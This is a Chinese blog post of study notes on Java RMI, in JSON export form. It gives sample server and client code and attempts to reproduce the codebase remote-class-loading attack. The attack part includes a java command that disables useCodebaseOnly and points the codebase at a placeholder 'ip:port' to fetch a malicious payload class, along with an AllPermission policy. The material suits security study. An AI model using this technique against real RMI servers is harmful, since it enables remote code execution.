{"title":"Java RMI笔记","uid":"fb61931117f747252b543f33903e3e6d","slug":"Java-RMI笔记","date":"2022-09-05T11:38:51.000Z","updated":"2022-09-05T11:52:31.086Z","comments":true,"path":"api/articles/Java-RMI笔记.json","keywords":null,"cover":null,"content":"<h1 id=\"参考资料：\"><a href=\"#参考资料：\" class=\"headerlink\" title=\"参考资料：\"></a>参考资料：</h1><p>廖雪峰老师 Java教程 RMI</p>\n<p><a href=\"https://www.liaoxuefeng.com/wiki/1252599548343744/1323711850348577\">https://www.liaoxuefeng.com/wiki/1252599548343744/1323711850348577</a></p>\n<p>p牛  Java安全漫谈456 RMI </p>\n<p><a href=\"https://t.zsxq.com/052Nj62Jq\">https://t.zsxq.com/052Nj62Jq</a></p>\n<p><a href=\"https://t.zsxq.com/057qNvJ6I\">https://t.zsxq.com/057qNvJ6I</a></p>\n<p><a href=\"https://t.zsxq.com/05j2fM7iE\">https://t.zsxq.com/05j2fM7iE</a></p>\n<p>seebug文章</p>\n<p><a href=\"https://paper.seebug.org/1091/\">https://paper.seebug.org/1091/</a></p>\n<p>Java各种协议分析</p>\n<p><a href=\"https://i.blackhat.com/eu-19/Wednesday/eu-19-An-Far-Sides-Of-Java-Remote-Protocols.pdf\">https://i.blackhat.com/eu-19/Wednesday/eu-19-An-Far-Sides-Of-Java-Remote-Protocols.pdf</a></p>\n<h1 id=\"原理：\"><a href=\"#原理：\" class=\"headerlink\" title=\"原理：\"></a>原理：</h1><p>客户端远程调用服务端代码，在服务端执行改代码，并返回结果给客户端</p>\n<p>整个过程由RMI底层负责实现序列化和反序列化</p>\n<p>要实现RMI，服务器和客户端必须共享同一个接口。</p>\n<p>Java的RMI规定此接口必须派生自java.rmi.Remote，并在每个方法声明抛出RemoteException。</p>\n<p>Java的RMI严重依赖序列化和反序列化，而这种情况下可能会造成严重的安全漏洞，因为Java的序列化和反序列化不但涉及到数据，还涉及到二进制的字节码，即使使用白名单机制也很难保证100%排除恶意构造的字节码。因此，使用RMI时，双方必须是内网互相信任的机器，不要把1099端口暴露在公网上作为对外服务。</p>\n<p>此外，Java的RMI调用机制决定了双方必须是Java程序，其他语言很难调用Java的RMI。如果要使用不同语言进行RPC调用，可以选择更通用的协议，例如<a href=\"https://grpc.io/\">gRPC</a>。</p>\n<p>RMI Registry    提供注册，并将其绑定到RMI Server的对象上</p>\n<p>RMI Server    提供远程服务，里面有各种方法，有返回结果</p>\n<p>RMI Client     连接Registry，之后调用Server上的方法，获取返回结果</p>\n<h1 id=\"简单RMI：\"><a href=\"#简单RMI：\" class=\"headerlink\" title=\"简单RMI：\"></a>简单RMI：</h1><h3 id=\"服务端：\"><a href=\"#服务端：\" class=\"headerlink\" title=\"服务端：\"></a>服务端：</h3><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">package com.rmitest;\n\nimport java.rmi.Naming;\nimport java.rmi.Remote;\nimport java.rmi.RemoteException;\nimport java.rmi.registry.LocateRegistry;\nimport java.rmi.registry.Registry;\nimport java.rmi.server.UnicastRemoteObject;\n\n&#x2F;&#x2F;RMI服务创建后，将在后台开启监听线程，代码中并没有停止线程，\n&#x2F;&#x2F;所以需要使用资源管理器，搜索线程pid去停止该线程\npublic class RMIServer &#123;\n\t&#x2F;&#x2F;RMIServer端分为三个部分\n\t&#x2F;&#x2F;⼀个继承了 java.rmi.Remote 的接⼝，其中定义我们要远程调⽤的函数，⽐如这⾥的 hello()\n\tpublic interface IRemoteHelloWorld extends Remote &#123;\n\t\t public String hello() throws RemoteException;\n\t&#125;\n\t\t&#x2F;&#x2F;⼀个实现了此接⼝的类\n\tpublic class RemoteHelloWorld extends UnicastRemoteObject implements\n\t\tIRemoteHelloWorld &#123;\n\t\t protected RemoteHelloWorld() throws RemoteException &#123;\n\t\t\t super();\n\t\t \t&#125;\n\t\t \n\t\t public String hello() throws RemoteException &#123;\n\t\t\t System.out.println(&quot;call from&quot;);\n\t\t\t return &quot;Hello world&quot;;\n\t\t \t&#125;\n\t&#125;\n\t\t \n\tprivate void start() throws Exception &#123;\n\t\t&#x2F;&#x2F;用来创建Registry，\n\t\t&#x2F;&#x2F;并将上面的类实例化后绑定到⼀个地址。\n\t\t &#x2F;&#x2F;这就是我们所谓的Server了。s\n\t\tRemoteHelloWorld h &#x3D; new RemoteHelloWorld();\n\t\tLocateRegistry.createRegistry(1099);\n\t\tNaming.rebind(&quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;Hello&quot;, h);\n\t&#125;\n\t\n\t&#x2F;&#x2F;实例化RMIServer类，并执行start方法\n\tpublic static void main(String[] args) throws Exception &#123;\n\t\t\t new RMIServer().start();\n\t&#125;\n\t\n&#125;</code></pre>\n\n<h3 id=\"客户端：\"><a href=\"#客户端：\" class=\"headerlink\" title=\"客户端：\"></a>客户端：</h3><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">package com.rmitest;\n\nimport com.rmitest.RMIServer;\nimport java.rmi.Naming;\nimport java.rmi.NotBoundException;\nimport java.rmi.RemoteException;\n\npublic class RMIClient &#123;\n\n\tpublic static void main(String[] args) throws Exception &#123;\n\t\t RMIServer.IRemoteHelloWorld hello &#x3D; \n\t\t\t\t (RMIServer.IRemoteHelloWorld)Naming.lookup(&quot;rmi:&#x2F;&#x2F;192.168.0.107:1099&#x2F;Hello&quot;);\n\t\t String ret &#x3D; hello.hello();\n\t\t System.out.println(ret);\n\t&#125;\n\n\n&#125;</code></pre>\n\n\n\n<h1 id=\"利用：\"><a href=\"#利用：\" class=\"headerlink\" title=\"利用：\"></a>利用：</h1><p> <strong>1. 如果我们能访问RMI Registry服务，如何对其攻击？</strong></p>\n<p> <strong>2. 如果我们控制了目标RMI客户端中 Naming.lookup 的第一个参数（也就是RMI Registry的地 址），能不能进行攻击？</strong>  </p>\n<p>首先测试RMI Registry 的远程调用，发现RMI Registry  只允许本地调用rebind、bind、unbind方法，远程调用允许list、lookup方法</p>\n<p>list方法能获取服务端所有绑定的对象列表</p>\n<p>lookup则是能获取服务端某个对象</p>\n<p>lookup让我们能够调用服务端上存在的危险方法</p>\n<p><a href=\"https://github.com/NickstaDB/BaRMIe\">https://github.com/NickstaDB/BaRMIe</a>  该项目可以测试RMI上存在的危险方法</p>\n<h1 id=\"Applet-codebase任意代码执行\"><a href=\"#Applet-codebase任意代码执行\" class=\"headerlink\" title=\"Applet codebase任意代码执行\"></a>Applet codebase任意代码执行</h1><h2 id=\"要求：\"><a href=\"#要求：\" class=\"headerlink\" title=\"要求：\"></a>要求：</h2><ol>\n<li> 安装并配置了SecurityManager  </li>\n<li>Java版本低于7u21、6u45，或者设置了 java.rmi.server.useCodebaseOnly=false  ，这个之前版本默认java.rmi.server.useCodebaseOnly=false  </li>\n</ol>\n<h2 id=\"复现：\"><a href=\"#复现：\" class=\"headerlink\" title=\"复现：\"></a>复现：</h2><p>按照安全漫谈5，写好3个服务类，之后运行服务端</p>\n<h3 id=\"RemoteRMIServer\"><a href=\"#RemoteRMIServer\" class=\"headerlink\" title=\"RemoteRMIServer\"></a>RemoteRMIServer</h3><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">package com.rmitest.CodeBase;\n\nimport java.rmi.Naming;\nimport java.rmi.Remote;\nimport java.rmi.RemoteException;\nimport java.rmi.registry.LocateRegistry;\nimport java.rmi.server.UnicastRemoteObject;\nimport java.util.List;\n\npublic class RemoteRMIServer &#123;\n\tprivate void start() throws Exception &#123;\n\t\tif (System.getSecurityManager() &#x3D;&#x3D; null) &#123;\n\t\t\tSystem.out.println(&quot;setup SecurityManager&quot;);\n\t\t\tSystem.setSecurityManager(new SecurityManager());\n\t\t&#125;\n\t\tCalc h &#x3D; new Calc();\n\t\tLocateRegistry.createRegistry(1099);\n\t\tNaming.rebind(&quot;refObj&quot;, h);\n\t&#125;\n\tpublic static void main(String[] args) throws Exception &#123;\n\tnew RemoteRMIServer().start();\n\t&#125;\n&#125;\n\n</code></pre>\n\n<h3 id=\"ICalc\"><a href=\"#ICalc\" class=\"headerlink\" title=\"ICalc\"></a>ICalc</h3><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">package com.rmitest.CodeBase;\n\nimport java.rmi.Remote;\n\nimport java.rmi.RemoteException;\nimport java.util.List;\npublic interface ICalc extends Remote &#123;\n\tpublic Integer sum(List&lt;Integer&gt; params) throws RemoteException;\n&#125;\n</code></pre>\n\n<h3 id=\"Calc\"><a href=\"#Calc\" class=\"headerlink\" title=\"Calc\"></a>Calc</h3><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">package com.rmitest.CodeBase;\n\nimport java.rmi.Remote;\nimport java.rmi.RemoteException;\nimport java.util.List;\nimport java.rmi.server.UnicastRemoteObject;\n\npublic class Calc extends UnicastRemoteObject implements ICalc &#123;\n\tpublic Calc() throws RemoteException &#123;&#125;\n\tpublic Integer sum(List&lt;Integer&gt; params) throws RemoteException &#123;\n\t\tInteger sum &#x3D; 0;\n\t\tfor (Integer param : params) &#123;\n\t\t\tsum +&#x3D; param;\n\t\t&#125;\n\t\treturn sum;\n\t&#125;\n&#125;\n</code></pre>\n\n<p>同时该文件夹需要有client.policy文件</p>\n<pre class=\"line-numbers language-policy\" data-language=\"policy\"><code class=\"language-policy\">grant &#123;\n\tpermission java.security.AllPermission;\n&#125;;</code></pre>\n\n<p>javac *.java</p>\n<p>带着包名编译，在java文件目录无法执行程序，需要切换到src目录执行命令</p>\n<p>同时需要将Client.policy放到src目录下</p>\n<p>java -Djava.rmi.server.hostname=192.168.0.107 -Djava.rmi.server.useCodebaseOnly=false -Djava.security.policy=client.policy <strong>com.rmitest.CodeBase.RemoteRMIServer</strong></p>\n<p>这时执行程序需要用完整程序名</p>\n<p>在另一个文件夹编写好client类，编译运行</p>\n<h3 id=\"RMIClient\"><a href=\"#RMIClient\" class=\"headerlink\" title=\"RMIClient\"></a>RMIClient</h3><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">package com.rmitest.CodeBaseClient;\n\nimport java.rmi.Naming;\nimport java.rmi.Remote;\nimport java.rmi.RemoteException;\nimport java.util.List;\n\nimport com.rmitest.CodeBase.ICalc;\n\nimport java.util.ArrayList;\nimport java.io.Serializable;\n\npublic class RMIClient implements Serializable &#123;\t\n\t\n\tpublic class Payload extends ArrayList&lt;Integer&gt; &#123;&#125;\n\tpublic void lookup() throws Exception &#123;\n\t\t&#x2F;&#x2F;需要设置，不然报错\n\t\tif (System.getSecurityManager() &#x3D;&#x3D; null) &#123;\n\t\t\t\tSystem.out.println(&quot;setup SecurityManager&quot;);\n\t\t\t\tSystem.setSecurityManager(new SecurityManager());\n\t\t&#125;\n\t\tICalc r &#x3D; (ICalc)\n\t\t\t\tNaming.lookup(&quot;rmi:&#x2F;&#x2F;192.168.0.107:1099&#x2F;refObj&quot;);\n\t\tList&lt;Integer&gt; li &#x3D; new Payload();\n\t\tli.add(3);\n\t\tli.add(4);\n\t\tSystem.out.println(r.sum(li));\n\t&#125;\n\tpublic static void main(String[] args) throws Exception &#123;\n\t\tnew RMIClient().lookup();\n\t&#125;\n&#125;</code></pre>\n\n<p>javac RMIClient.java -classpath ../../../</p>\n<p>修改命令</p>\n<p>java  -Djava.rmi.server.useCodebaseOnly=false  -Djava.rmi.server.codebase=<a href=\"http://ip:port/RMIClient$Payload.class\">http://ip:port/RMIClient$Payload.class</a> -Djava.security.policy=client.policy com.rmitest.CodeBaseClient.RMIClient</p>\n<p>这个codebase可以修改为自己服务器的IP:port</p>\n<p>当客户端运行时，服务端在classpath找不到/RMIClient$Payload.class 时，会尝试去远程加载codebase路径下的 /RMIClient$Payload.class</p>\n<p>这时只需要将恶意类放到服务器的 <strong>/RMIClient$Payload.class</strong>  就能执行恶意代码  </p>\n<p>需要注意的是，这个客户端不能放到服务端一起，需要在另一个地方运行，连接后才能让服务端找不到 <strong>/RMIClient$Payload.class</strong>      <strong>但是就是这样复现就有问题了</strong></p>\n<h3 id=\"问题：\"><a href=\"#问题：\" class=\"headerlink\" title=\"问题：\"></a>问题：</h3><ol>\n<li>复现时执行服务端和客户端代码都报错：错误: 找不到或无法加载主类</li>\n<li>尝试用客户端连接，发现报错：no security manager: RMI class loader disabled</li>\n<li>再次尝试连接报错：Exception in thread “main” java.security.AccessControlException: access denied (“java.net.SocketPermission” “192.168.0.107:1099” “connect,resolve”)</li>\n<li>解决前面的问题后发现只能本地访问**/RMIClient$Payload.class,就算删除本地/RMIClient$Payload.class文件，设置了codebase远程连接他也不会远程访问获取，而是直接报错找不到该文件**</li>\n</ol>\n<h3 id=\"解决：\"><a href=\"#解决：\" class=\"headerlink\" title=\"解决：\"></a>解决：</h3><ol>\n<li>配置好classpath，尝试去除包名编译，可以运行服务端</li>\n<li>这个星球有人讲了，在客服端也需要设置SecurityManager</li>\n<li>这个解决方式是在客户端执行命令的时候也要在policy文件</li>\n<li>暂时没有解决</li>\n</ol>\n","text":"参考资料：廖雪峰老师 Java教程 RMI https://www.liaoxuefeng.com/wiki/1252599548343744/1323711850348577 p牛 Java安全漫谈456 RMI https://t.zsxq.com/052Nj62Jq htt...","link":"","photos":[],"count_time":{"symbolsCount":"7k","symbolsTime":"6 mins."},"categories":[{"name":"Java安全","slug":"Java安全","count":11,"path":"api/categories/Java安全.json"}],"tags":[{"name":"Java","slug":"Java","count":20,"path":"api/tags/Java.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99%EF%BC%9A\"><span class=\"toc-text\">参考资料：</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8E%9F%E7%90%86%EF%BC%9A\"><span class=\"toc-text\">原理：</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E7%AE%80%E5%8D%95RMI%EF%BC%9A\"><span class=\"toc-text\">简单RMI：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%9C%8D%E5%8A%A1%E7%AB%AF%EF%BC%9A\"><span class=\"toc-text\">服务端：</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%AE%A2%E6%88%B7%E7%AB%AF%EF%BC%9A\"><span class=\"toc-text\">客户端：</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%88%A9%E7%94%A8%EF%BC%9A\"><span class=\"toc-text\">利用：</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#Applet-codebase%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C\"><span class=\"toc-text\">Applet codebase任意代码执行</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E8%A6%81%E6%B1%82%EF%BC%9A\"><span class=\"toc-text\">要求：</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%A4%8D%E7%8E%B0%EF%BC%9A\"><span class=\"toc-text\">复现：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#RemoteRMIServer\"><span class=\"toc-text\">RemoteRMIServer</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#ICalc\"><span class=\"toc-text\">ICalc</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Calc\"><span class=\"toc-text\">Calc</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#RMIClient\"><span class=\"toc-text\">RMIClient</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E9%97%AE%E9%A2%98%EF%BC%9A\"><span class=\"toc-text\">问题：</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E8%A7%A3%E5%86%B3%EF%BC%9A\"><span class=\"toc-text\">解决：</span></a></li></ol></li></ol></li></ol>","author":{"name":"Longw","slug":"blog-author","avatar":"https://userblink.csdnimg.cn/20211213/qq_57037477/pic/7db9b5c05ba342a75ddf06eecf740949-0.jpg","link":"/","description":"一个不想开挂的安全实习生","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"Java反序列化1笔记","uid":"ef40a0cd7170df96b7fe2fe93ccaa11e","slug":"Java反序列化1笔记","date":"2022-09-05T11:53:13.000Z","updated":"2022-09-10T07:34:11.423Z","comments":true,"path":"api/articles/Java反序列化1笔记.json","keywords":null,"cover":null,"text":"参考资料：p牛 Java安全漫谈7 8 反序列化1 2 https://t.zsxq.com/05QrVnMBy https://t.zsxq.com/053zvFeAu Java反序列化利用基础在Java 中，主要是通过 writeobject写入序列化数据到stream 并将...","link":"","photos":[],"count_time":{"symbolsCount":"2.7k","symbolsTime":"2 mins."},"categories":[{"name":"Java安全","slug":"Java安全","count":11,"path":"api/categories/Java安全.json"}],"tags":[{"name":"Java","slug":"Java","count":20,"path":"api/tags/Java.json"}],"author":{"name":"Longw","slug":"blog-author","avatar":"https://userblink.csdnimg.cn/20211213/qq_57037477/pic/7db9b5c05ba342a75ddf06eecf740949-0.jpg","link":"/","description":"一个不想开挂的安全实习生","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"Java反射笔记","uid":"a87dfbaadf5431aac0df9631c18a8ee5","slug":"Java反射笔记","date":"2022-09-05T11:36:43.000Z","updated":"2022-09-05T12:22:46.244Z","comments":true,"path":"api/articles/Java反射笔记.json","keywords":null,"cover":null,"text":"参考资料： 廖雪峰老师Java教程 反射 https://www.liaoxuefeng.com/wiki/1252599548343744/1255945147512512 p牛Java安全漫谈 反射篇1，2，3 https://t.zsxq.com/056qbMzVV htt...","link":"","photos":[],"count_time":{"symbolsCount":"4k","symbolsTime":"4 mins."},"categories":[{"name":"Java安全","slug":"Java安全","count":11,"path":"api/categories/Java安全.json"}],"tags":[{"name":"Java","slug":"Java","count":20,"path":"api/tags/Java.json"}],"author":{"name":"Longw","slug":"blog-author","avatar":"https://userblink.csdnimg.cn/20211213/qq_57037477/pic/7db9b5c05ba342a75ddf06eecf740949-0.jpg","link":"/","description":"一个不想开挂的安全实习生","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}